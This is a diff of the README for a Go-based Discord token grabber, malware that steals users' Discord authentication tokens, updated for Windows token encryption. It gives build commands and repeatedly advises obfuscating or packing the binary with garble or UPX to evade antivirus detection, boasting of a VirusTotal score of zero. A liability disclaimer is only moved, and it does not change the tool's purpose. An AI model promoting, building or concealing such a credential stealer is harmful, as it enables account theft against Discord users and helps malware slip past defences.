@@ -1,19 +1,8 @@
-# ⚠ Currently Being Updated for Windows ! Next Release: 10/06/2022
-
 # Discord Token Grabber Written in Go !
 
-### Liability Disclaimer ⚠
-
-The use of this software on any device that is not your own is highly discouraged. 
-You need to obtain explicit permission from the owner if you intend to use this program in an environment you don't own, 
-any illicit installation will likely be prosecuted by the jurisdiction the (ab)use occurs in.
-
-Creators shall not be liable for any indirect, incidental, special, consequential or punitive damages, or any loss of profits
-or revenue, whether incurred directly or indirectly, or any loss of data, use, goodwill, or other intangible losses,
-resulting from:
-- (i) your access to this resource and/or inability to access this resource
-- (ii) any conduct or content of any third party referenced by this resource, including without limitation, any defamatory, offensive or illegal conduct or other users or third parties
-- (iii) any content obtained from this resource
+*Since the new Discord Update, discord encrypts the token on Windows using WinApi specific functions and AES GCM.
+It means that the token grabber is now platform dependant. The code on this current branch is designed for Windows Systems. 
+If you wish to use it for Linux & MacOS, please checkout the [Unix](https://github.com/faceslog/discord-grabber-go/tree/unix) branch*
 
 ### Features: ⚙
 
@@ -40,21 +29,33 @@ const (
 )
 ```
 
-Then simply compile the `main.go` file !
+Then simply compile the `main.go win.go` files !
 ```sh
 # This command will keep debug info in your exe, and it will be detected by AVs 
 # You can avoid this by using specific config flags that I won't provide here ! 
 # with the correct config flags + some obfuscation the score on Virus Total is 0 
-go build main.go
+go build main.go win.go
 # By default, go build combines symbol and debug info with binary files. 
 # However, you can remove the symbol and debug info with 
-go build -ldflags "-s -w"
+go build -ldflags "-s -w" main.go win.go
 ```
 You should probably obfuscate or pack the executable file to avoid being detected by AVs. 
-You can check out: https://github.com/burrowers/garble
+You can check out: https://github.com/burrowers/garble or https://upx.github.io/
 
 ### Contributing
 
-Since it was my first go program there are things that can be improved for sure, don't hesitate to let me know 
+Since it was one of my first go program there are things that can be improved for sure, don't hesitate to let me know.
 
+### Liability Disclaimer ⚠
+
+The use of this software on any device that is not your own is highly discouraged.
+You need to obtain explicit permission from the owner if you intend to use this program in an environment you don't own,
+any illicit installation will likely be prosecuted by the jurisdiction the (ab)use occurs in.
+
+Creators shall not be liable for any indirect, incidental, special, consequential or punitive damages, or any loss of profits
+or revenue, whether incurred directly or indirectly, or any loss of data, use, goodwill, or other intangible losses,
+resulting from:
+- (i) your access to this resource and/or inability to access this resource
+- (ii) any conduct or content of any third party referenced by this resource, including without limitation, any defamatory, offensive or illegal conduct or other users or third parties
+- (iii) any content obtained from this resource
 
